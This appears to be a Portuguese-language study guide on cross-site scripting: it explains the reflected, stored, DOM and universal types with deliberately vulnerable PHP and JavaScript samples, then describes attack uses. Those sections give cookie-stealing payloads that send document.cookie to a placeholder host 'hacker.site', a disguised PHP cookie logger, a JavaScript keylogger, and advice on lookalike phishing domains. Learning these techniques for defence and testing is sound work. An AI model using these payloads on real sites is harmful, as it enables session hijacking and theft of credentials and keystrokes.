O XSS acontece quando o browser renderiza conteúdos não confiáveis em um ambiente confiável. Se o conteúdo enviado contém uma linguagem dinâmica como HTML, JavaScript ou outro, o conteúdo vai ser executado

XSS pode ser dividido em duas categorias principais:
- Server-side
- Client-side (impacta somente o cliente)

## Reflected XSS

Ocorre quando dados não confiáveis são enviados pelo usuário para uma aplicação web e a resposta é imediatamente mostrada na tela

Exemplo de um código PHP com esse tipo de vulnerabilidade:
```php
<?php $name = @$_GET['name']; ?>
Welcome <?=$name?>
```

Normalmente para explorar essa vulnerabilidade é preciso criar links e envolve um pouco de engenharia social

## Persistent XSS

Também conhecido como Stored XSS, é similar ao reflected mas o seu conteúdo fica armazenado na aplicação web, dessa forma todos os visitantes da página são atingidos

Exemplo de um código PHP com esse tipo de vulnerabilidade:
```php
// Newcomers Logging System
<?php
$file = 'newcomers.log';
if(@$_GET['name']){
	$current = file_get_contents($file);
	$current .= $_GET['name']."\n";
	// Store the newcomer
	file_put_contents($file, $current);
}
// If admin show newcomers
if(@$_GET['admin']==1)
	echo file_get_contents($file);
```

## DOM XSS

É um tipo de XSS que acontece somente do lado do cliente. É muito similar ao Reflected XSS mas não interage com o servidor

Exemplo de um código vulnerável:
```html
<h1 id='welcome'></h1>
<script>
	var w = "Welcome ";
	var name = document.location.hash.substr(
		document.location.hash.search(/#w!/i)+3,
		document.location.hash.length
	);
	document.getElementById('welcome').innerHTML = w + name;
</script>
```

https://code.google.com/archive/p/domxsswiki/
## Universal XSS

Diferente dos outros 3 tipos de XSS o universal XSS não explora falhas em códigos, mas em browsers, extensões e plugins
# XSS Attacks

Para que o XSS pode ser usado?
## Cookie Gathering

O XSS pode ser usado para obter cookies de usuários, afim de obter informações sensíveis ou realizar um roubo de sessão

Normalmente o roubo de cookies possui 3 passos:
- Script Injection
- Cookie recording
- Logging
### Script Injection

Onde é injetado o payload malicioso que vai enviar os cookies para o nosso servidor. O DOM nos permite acessar os cookies usando o ```document.cookie```

Para realizar o roubo do cookie, é preciso enviar o conteúdo do document.cookie para algum lugar onde temos controle, isso pode ser feito usando um script como:
```javascript
new Image().src="http://hacker.site/C.php?cc="+escape(document.cookie);
```

Opções para diferentes cenários:
```html
<!-- Script Variable -->
<script> var a=">>INJ<<"; </script>
-> ";new Image().src="http://hacker.site/C.php?cc="+escape(document.cookie);//
-> ";new Audio().src="http://hacker.site/C.php?cc="+escape(document.cookie);//

<!-- Attribute -->
<div id=">>INJ<<">
-> x" onmouseover="new Image().src='http://hacker.site/C.php?cc='+escape(document.cookie)

<video width="320" height=">>INJ<<">
-> 240' src=x onerror="new Audio().src='http://hacker.site/C.php?cc='+escape(document.cookie)

<!-- HREF -->
<a href="victim.site/#>>INJ<<">
-> x" onclick="new Image().src='http://hacker.site/C.php?cc='+escape(document.cookie)
```

### Cookie Recording & Logging

São os próximos passos, nesse momento já temos uma requisição sendo feita enviando as informações para o nosso servidor, então é necessário tratar e armazenar essa informação

Seguindo o exemplo anterior, podemos supor que temos um script PHP escutando no nosso servidor e esse script vai armazenar as informações em um arquivo

Uma forma simples se fazer esse script é:
```php
<?php
error_reporting(0); # Turn off all error reporting

$cookie = $_GET['cc']; # request to log
$file = '_cc_.txt'; # the log file
$handle = fopen($file,"a"); # Open log file in append mode

# Append the cookie
fwrite($handle,$cookie."\n"); 
fclose($handle); 

echo '<h1>Page Under Construction</h1>'; # Trying to hide suspects...
```

Em um cenário onde temos um único servidor recebendo informações de múltiplas páginas web que foram exploradas, é necessário deixar o código um pouco mais complexo, adicionando algumas informações a mais que ajudaram a identificar a origem

Uma forma mas avançada:
```php
<?php error_reporting(0); # Turn off all error reporting
function getVictimIP(){...} # Function that returns th victim IP
function collect(){
	$file = '_cc_.txt'; # tho log file
	$date = date("1 dS of F Y h:i:s A"); # Date
	$IP = gitVictimIP(); # A function that returns victim IP
	$cookie = $SERVER['QUERY_STRING']; # All query string
	$info = "** other valuable information **";

	$log = "[$date]\n\t> Victim IP: $IP\n\t> Cookies: $cookie\n\t> Extra info: $info\n";
	$handle = fopen($file,"a"); # Open log file in append mode
	fwrite($handle,$log."\n\n"); 
	fclose($handle);
}
collect();
echo '<h1>Page Under Construction</h1>'; # Trying to hide suspects...
```
#### Netcat

Se precisa de uma solução rápida para receber os cookies, pode ser usado o netcat

```shell
sudo nc -lnvp 80
```

### Bypassing HTTPOnly Flag

**XST** (antiga)

Até agora os ataques vistos só funcionam se o cookie não estiver com a flag HTTPOnly setada.

Para burlar essa proteção foi inventado uma técnica chamada de XST (Cross-Site Tracing), mas ela não funciona mais hoje

Basicamente, essa técnica utiliza o método TRACE para enviar uma requisição contendo o cookie. Ela está descrita nesse paper: https://www.cgisecurity.com/whitehat-mirros/wh-whitepaper_xst_ebook.pdf

**CVE-2012-0053**

Outra forma de conseguir cookies com HTTPOnly é explorando uma vulnerabilidade no servidor. Um exemplo disso ocorre com o Apache HTTP Server 2.2.x 

Essa vulnerabilidade pode ser explorada usando ferramentas como o BeEF ou a POC: https://gist.github.com/pilate/1955a1c28324d4724b7b

**BeEF's Tunneling Proxy**

Uma alternativa é usar o browser da vitima como um proxy. Basicamente, explorando o XSS podemos usar o browser da vitima para fazer requisições para a aplicação

Para criar esse proxy, podemos usar a ferramenta BeEF, que nos ajuda a realizar hookes no browser. Essa técnica é interessante pois nos permite bypassar não só o HTTPOnly mas todas as proteções de validações usadas pelo servidor
## Defacements

O XSS também pode ser usado para fazer defacements em sites. Podemos dividir esse tipo de ataque em 2 categorias: Persistente e Não persistente. Ele também pode ser usado como parte de ataques mais sofisticados
## Phishing

É possível utilizar o XSS para fazer ataques de phishing

Normalmente em um ataque de phishing, precisamos criar um site fake ou clonar algum site que será o alvo do ataque, e dentro desse site fake o atacante coloca o código que ele quer executar. Porém, se um site é vulnerável a XSS isso não é necessário, porque é possível colocar o código malicioso no próprio site alvo

Como exemplo, podemos imaginar cenário onde queremos pegar informações de um site. Esse site possui um formulário onde os usuários enviam suas informações, então podemos usar o XSS para modificar o comportamento desse formulário para enviar as informações para o atacante
### Cloning a Website

Se quiser clonar um site para colocar o payload podemos usar algumas ferramentas:

- Wget
- BeEF
- Site Cloner

Um ponto muito importante para o sucesso no ataque de phishing após clonar um site é a escolha do domínio que será usado. Quanto mais parecido com o original melhor. Um exemplo de escolha pode ser o seguinte:
```
www.google.com -> wwwgoogle.com
```

Para ajudar na escolha do domínio, podemos usar a ferramenta URLCrazy

```
urlcrazy www.google.com
```

## Keylogging

As vezes é interessante saber o que a vitima está digitando no site, com isso podemos, por exemplo, ler conversas, senhas, número de cartão de crédito, etc...

Existem diversas formas de se fazer isso. Podemos fazer isso com um simples JavaScript
```javascript
var keys = ""; // WHERE -> Where to store the key strokes
document.onkeypress = function(e){
	var get = windows.event ? event : e;
	var key = get.keyCode ? get.keyCode : get.charCode;
	key = String.fromCharCode(key);
	keys += key;
}

windows.setInterval(function(){
	if(keys != ""){
		// HOW -> sends the key strokes via GET using an Image element to listening hacker.site server
		var path = ncodeURI("http://hacker.site/keylogger?k="+keys);
		new Image().src = path;
		keys = "";
	}
}, 1000); //WHEN -> sends the key strokes every second
```

Também é possível criar um keylogging usando ferramentas como:
- BeEF (Event logger)
- Metasploit (http_javascript_keylogger)

### Keylogging with Mtasploit

O metasploit possui o módulo auxiliar "http_javascript_keylogger", que é um script mais avançado que o mostrado acima. Ele cria o payload para ser injetado na página vulnerável

Ele também tem a opção de criar uma página demo para teste usando o:
```
set DEMO true
```
### Keylogging with BeEF

O **Event Logger** do BeEF é uma versão melhorada dos exemplos acima, pois ele consegue mostrar teclas especiais. Para entender a diferença, vamos imaginar que um usuário tem o login e senha iguais, então ele escreve o login copia e cola no campo de senha, normalmente no keylogger veríamos somente as teclas: acv.

Já com o BeEF conseguimos ver \[Ctrl] a - \[Ctrl] c - \[Ctrl] v
## Network Attacks

Com XSS é possível descobrir informações da rede interna explorando o navegador da vitima
### IP Detection

Antes de realizar qualquer atividade na rede interna, é interessante levantar informações sobre o ambiente, como por exemplo IPs da rede interna

Existe uma abordagem usada para isso que utiliza o WebRTC do HTML5 para descobrir o endereço de IP local. Uma POC dessa técnica está aqui: http://net.ipcalf.com

Outra POC também foi criada adicionando algumas informações a mais, e pode ser encontrada aqui: https://web.archive.org/web/20160406083801/https://dl.dropboxusercontent.com/u/1878671/enumhosts.html

Essa técnica não funciona em todos os navegadores, para saber se o navegador alvo pode executar essa funcionalidade você pode fazer uma consulta aqui: http://caniuse.com/#feat=rtcpeerconnection

Ainda é possível realizar outras atividades como: descobrir hosts na rede, enumerar portas abertas nos hosts, entre outros. Porém as técnicas utilizadas variam bastante quanto a certeza do resultado

